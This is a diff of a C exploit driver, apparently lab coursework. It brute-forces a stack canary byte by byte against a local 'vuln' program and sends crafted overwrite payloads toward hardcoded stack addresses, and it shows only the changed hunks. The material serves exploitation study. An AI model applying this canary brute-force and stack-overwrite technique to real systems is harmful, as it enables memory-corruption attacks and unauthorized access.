@@ -5,7 +5,7 @@ int main() {
     nargv[0] = "vuln";
     nargv[1] = STRINGIFY(GRP);
     nargv[2] = NULL;
-    char outbuf[1<<20];
+    char *outbuf;
 
     uint64_t auth_db_loc =     0x7ffc8b4ee588; // loc of db (local var of auth)
     uint64_t auth_cred     =   0x7ffc8b4ee4a0; // value of cred (after alloca)
@@ -17,11 +17,6 @@ int main() {
             "to continue with the exploit\n");
 
     getchar();
-    get_formatted("%*s"); //Needed to clear out the Welcome message
-
-    put_str("p 1234567\n");
-    send();
-    get_formatted("%*s");
 
     uint64_t stack_canary = 0x0000000000000000;
     uint64_t current_byte = 0x00;
@@ -40,7 +35,13 @@ int main() {
             canary_bytes[8-i] = current_byte;
             expl[explsz/sizeof(void*)-1] = (void*)stack_canary;
 
-            fprintf(stderr, "i: %d,\tByte: %x,\tDetermined Canary: %x\n", i, current_byte, stack_canary);
+            get_formatted("%*s"); //Needed to clear out the Welcome message
+
+            put_str("p 1234567\n");
+            send();
+            get_formatted("%*s");
+
+            fprintf(stderr, "i: %d,\tByte: %lx,\tDetermined Canary: %lx\n", i, current_byte, stack_canary);
             put_str("u ");
             put_bin((char*)expl, explsz - 8 + i);
             put_str("\n");
@@ -62,17 +63,6 @@ int main() {
     // unsigned explsz = auth_db_cred_dist + 8 - 8 + 8;
     // void* *expl = (void**)malloc(explsz);
     // memset((void*)expl, 0x00, explsz);
-
-    put_str("u ");
-    put_bin((char*)expl, explsz);
-    put_str("\n");
-    send();
-    get_formatted("%*s");
-    put_str("l \n");
-    send();
-
-    usleep(100000);
-    get_formatted("%*s");
 
     kill(pid, SIGINT);
 
